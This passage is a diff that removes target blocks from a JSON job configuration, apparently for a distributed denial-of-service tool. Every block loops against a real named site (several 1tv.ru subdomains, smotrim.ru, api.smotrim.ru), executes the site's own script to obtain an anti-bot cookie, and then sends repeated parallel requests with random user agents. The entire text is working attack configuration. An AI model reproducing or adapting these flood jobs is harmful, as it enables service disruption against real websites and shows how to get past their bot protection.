-                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
-                              "Accept": "text/html",
-                              "Accept-Language": "en-US",
-                              "Connection": "keep-alive"
-                            }
-                          }
-                        }
-                      },
-                      {
-                        "type": "set-value",
-                        "name": "source",
-                        "args": {
-                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
-                        }
-                      },
-                      {
-                        "type": "set-value",
-                        "name": "extract-script",
-                        "args": {
-                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
-                        }
-                      },
-                      {
-                        "type": "js",
-                        "name": "exec-script",
-                        "args": {
-                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
-                        }
-                      },
-                      {
-                        "type": "parallel",
-                        "args": {
-                          "jobs": [
-                            {
-                              "type": "http",
-                              "count": 7,
-                              "args": {
-                                "request": {
-                                  "method": "GET",
-                                  "path": "https://25.1tv.ru/",
-                                  "headers": {
-                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
-                                  },
-                                  "cookies": {
-                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
-                                  }
-                                }
-                              }
-                            }
-                          ]
-                        }
-                      }
-                    ]
-                  }
-                }
-              }
-            }
-          }
-        }
-      }
-    }, {
-      "type": "loop",
-      "args": {
-        "job": {
-          "type": "discard-error",
-          "args": {
-            "job": {
-              "type": "timeout",
-              "args": {
-                "timeout": "1h",
-                "job": {
-                  "type": "sequence",
-                  "args": {
-                    "jobs": [
-                      {
-                        "type": "set-value",
-                        "name": "useragent",
-                        "args": {
-                          "value": "{{ random_user_agent }}"
-                        }
-                      },
-                      {
-                        "type": "http-request",
-                        "name": "initial",
-                        "args": {
-                          "request": {
-                            "method": "GET",
-                            "path": "https://kino.1tv.ru/",
-                            "headers": {
-                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
-                              "Accept": "text/html",
-                              "Accept-Language": "en-US",
-                              "Connection": "keep-alive"
-                            }
-                          }
-                        }
-                      },
-                      {
-                        "type": "set-value",
-                        "name": "source",
-                        "args": {
-                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
-                        }
-                      },
-                      {
-                        "type": "set-value",
-                        "name": "extract-script",
-                        "args": {
-                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
-                        }
-                      },
-                      {
-                        "type": "js",
-                        "name": "exec-script",
-                        "args": {
-                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
-                        }
-                      },
-                      {
-                        "type": "parallel",
-                        "args": {
-                          "jobs": [
-                            {
-                              "type": "http",
-                              "count": 7,
-                              "args": {
-                                "request": {
-                                  "method": "GET",
-                                  "path": "https://kino.1tv.ru/",
-                                  "headers": {
-                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
-                                  },
-                                  "cookies": {
-                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
-                                  }
-                                }
-                              }
-                            }
-                          ]
-                        }
-                      }
-                    ]
-                  }
-                }
-              }
-            }
-          }
-        }
-      }
-    }, {
-      "type": "loop",
-      "args": {
-        "job": {
-          "type": "discard-error",
-          "args": {
-            "job": {
-              "type": "timeout",
-              "args": {
-                "timeout": "1h",
-                "job": {
-                  "type": "sequence",
-                  "args": {
-                    "jobs": [
-                      {
-                        "type": "set-value",
-                        "name": "useragent",
-                        "args": {
-                          "value": "{{ random_user_agent }}"
-                        }
-                      },
-                      {
-                        "type": "http-request",
-                        "name": "initial",
-                        "args": {
-                          "request": {
-                            "method": "GET",
-                            "path": "https://users.1tv.ru/",
-                            "headers": {
-                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
-                              "Accept": "text/html",
-                              "Accept-Language": "en-US",
-                              "Connection": "keep-alive"
-                            }
-                          }
-                        }
-                      },
-                      {
-                        "type": "set-value",
-                        "name": "source",
-                        "args": {
-                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
-                        }
-                      },
-                      {
-                        "type": "set-value",
-                        "name": "extract-script",
-                        "args": {
-                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
-                        }
-                      },
-                      {
-                        "type": "js",
-                        "name": "exec-script",
-                        "args": {
-                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
-                        }
-                      },
-                      {
-                        "type": "parallel",
-                        "args": {
-                          "jobs": [
-                            {
-                              "type": "http",
-                              "count": 7,
-                              "args": {
-                                "request": {
-                                  "method": "GET",
-                                  "path": "https://users.1tv.ru/",
-                                  "headers": {
-                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
-                                  },
-                                  "cookies": {
-                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
-                                  }
-                                }
-                              }
-                            }
-                          ]
-                        }
-                      }
-                    ]
-                  }
-                }
-              }
-            }
-          }
-        }
-      }
-    }, {
-      "type": "loop",
-      "args": {
-        "job": {
-          "type": "discard-error",
-          "args": {
-            "job": {
-              "type": "timeout",
-              "args": {
-                "timeout": "1h",
-                "job": {
-                  "type": "sequence",
-                  "args": {
-                    "jobs": [
-                      {
-                        "type": "set-value",
-                        "name": "useragent",
-                        "args": {
-                          "value": "{{ random_user_agent }}"
-                        }
-                      },
-                      {
-                        "type": "http-request",
-                        "name": "initial",
-                        "args": {
-                          "request": {
-                            "method": "GET",
-                            "path": "https://admin.kino.1tv.ru/",
-                            "headers": {
-                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
-                              "Accept": "text/html",
-                              "Accept-Language": "en-US",
-                              "Connection": "keep-alive"
-                            }
-                          }
-                        }
-                      },
-                      {
-                        "type": "set-value",
-                        "name": "source",
-                        "args": {
-                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
-                        }
-                      },
-                      {
-                        "type": "set-value",
-                        "name": "extract-script",
-                        "args": {
-                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
-                        }
-                      },
-                      {
-                        "type": "js",
-                        "name": "exec-script",
-                        "args": {
-                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
-                        }
-                      },
-                      {
-                        "type": "parallel",
-                        "args": {
-                          "jobs": [
-                            {
-                              "type": "http",
-                              "count": 7,
-                              "args": {
-                                "request": {
-                                  "method": "GET",
-                                  "path": "https://admin.kino.1tv.ru/",
-                                  "headers": {
-                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
-                                  },
-                                  "cookies": {
-                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
-                                  }
-                                }
-                              }
-                            }
-                          ]
-                        }
-                      }
-                    ]
-                  }
-                }
-              }
-            }
-          }
-        }
-      }
-    }, {
-      "type": "loop",
-      "args": {
-        "job": {
-          "type": "discard-error",
-          "args": {
-            "job": {
-              "type": "timeout",
-              "args": {
-                "timeout": "1h",
-                "job": {
-                  "type": "sequence",
-                  "args": {
-                    "jobs": [
-                      {
-                        "type": "set-value",
-                        "name": "useragent",
-                        "args": {
-                          "value": "{{ random_user_agent }}"
-                        }
-                      },
-                      {
-                        "type": "http-request",
-                        "name": "initial",
-                        "args": {
-                          "request": {
-                            "method": "GET",
-                            "path": "https://smotrim.ru/",
-                            "headers": {
-                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
-                              "Accept": "text/html",
-                              "Accept-Language": "en-US",
-                              "Connection": "keep-alive"
-                            }
-                          }
-                        }
-                      },
-                      {
-                        "type": "set-value",
-                        "name": "source",
-                        "args": {
-                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
-                        }
-                      },
-                      {
-                        "type": "set-value",
-                        "name": "extract-script",
-                        "args": {
-                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
-                        }
-                      },
-                      {
-                        "type": "js",
-                        "name": "exec-script",
-                        "args": {
-                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
-                        }
-                      },
-                      {
-                        "type": "parallel",
-                        "args": {
-                          "jobs": [
-                            {
-                              "type": "http",
-                              "count": 7,
-                              "args": {
-                                "request": {
-                                  "method": "GET",
-                                  "path": "https://smotrim.ru/",
-                                  "headers": {
-                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
-                                  },
-                                  "cookies": {
-                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
-                                  }
-                                }
-                              }
-                            }
-                          ]
-                        }
-                      }
-                    ]
-                  }
-                }
-              }
-            }
-          }
-        }
-      }
-    }, {
-      "type": "loop",
-      "args": {
-        "job": {
-          "type": "discard-error",
-          "args": {
-            "job": {
-              "type": "timeout",
-              "args": {
-                "timeout": "1h",
-                "job": {
-                  "type": "sequence",
-                  "args": {
-                    "jobs": [
-                      {
-                        "type": "set-value",
-                        "name": "useragent",
-                        "args": {
-                          "value": "{{ random_user_agent }}"
-                        }
-                      },
-                      {
-                        "type": "http-request",
-                        "name": "initial",
-                        "args": {
-                          "request": {
-                            "method": "GET",
-                            "path": "https://api.smotrim.ru/",
-                            "headers": {
-                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
-                              "Accept": "text/html",
-                              "Accept-Language": "en-US",
-                              "Connection": "keep-alive"
-                            }
-                          }
-                        }
-                      },
-                      {
-                        "type": "set-value",
-                        "name": "source",
-                        "args": {
-                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
-                        }
-                      },
-                      {
-                        "type": "set-value",
-                        "name": "extract-script",
-                        "args": {
-                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
-                        }
-                      },
-                      {
-                        "type": "js",
-                        "name": "exec-script",
-                        "args": {
-                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
-                        }
-                      },
-                      {
-                        "type": "parallel",
-                        "args": {
-                          "jobs": [
-                            {
-                              "type": "http",
-                              "count": 7,
-                              "args": {
-                                "request": {
-                                  "method": "GET",
-                                  "path": "https://api.smotrim.ru/",
-                                  "headers": {
-                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
-                                  },
-                                  "cookies": {
-                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
-                                  }
-                                }
-                              }
-                            }
-                          ]
-                        }
-                      }
-                    ]
-                  }
-                }
-              }
-            }
-          }
-        }
-      }
-    } 
+    }
   ]
 }
